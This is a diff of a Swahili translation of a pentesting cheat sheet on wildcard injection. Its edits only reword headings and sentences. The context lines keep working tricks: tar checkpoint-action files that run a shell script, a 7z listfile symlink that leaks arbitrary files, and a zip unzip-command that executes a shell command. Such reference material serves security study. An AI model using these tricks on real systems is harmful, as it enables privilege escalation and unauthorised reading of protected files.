@@ -25,7 +25,7 @@ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.co
 
 ## Tar
 
-**Tekeleza amri zisizo na mipaka:**
+**Teua amri zisizo na mpangilio:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
@@ -35,7 +35,7 @@ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.co
 
 ## Rsync
 
-**Teza amri zisizo za kawaida:**
+**Tekeleza amri za kiholela:**
 ```bash
 Interesting rsync option from manual:
 
@@ -61,13 +61,13 @@ cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
-Kisha, wakati **7z** inatekelezwa, itachukulia `root.txt` kama faili inayoshikilia orodha ya faili ambazo inapaswa kubana (hiyo ndiyo maana ya kuwepo kwa `@root.txt`) na wakati 7z inasoma `root.txt` itasoma `/file/you/want/to/read` na **kwa sababu maudhui ya faili hii si orodha ya faili, itatupa kosa** linaloonyesha maudhui.
+Kisha, wakati **7z** inatekelezwa, itachukulia `root.txt` kama faili inayoshikilia orodha ya faili ambazo inapaswa kubana (hiyo ndiyo maana ya kuwepo kwa `@root.txt`) na wakati 7z inasoma `root.txt` itasoma `/file/you/want/to/read` na **kwa sababu maudhui ya faili hii si orodha ya faili, itatupa kosa** ikionyesha maudhui.
 
-_Maelezo zaidi katika Write-ups ya sanduku CTF kutoka HackTheBox._
+_Maelezo zaidi katika Write-ups ya sanduku la CTF kutoka HackTheBox._
 
 ## Zip
 
-**Tekeleza amri zisizo na mipaka:**
+**Tekeleza amri za kiholela:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
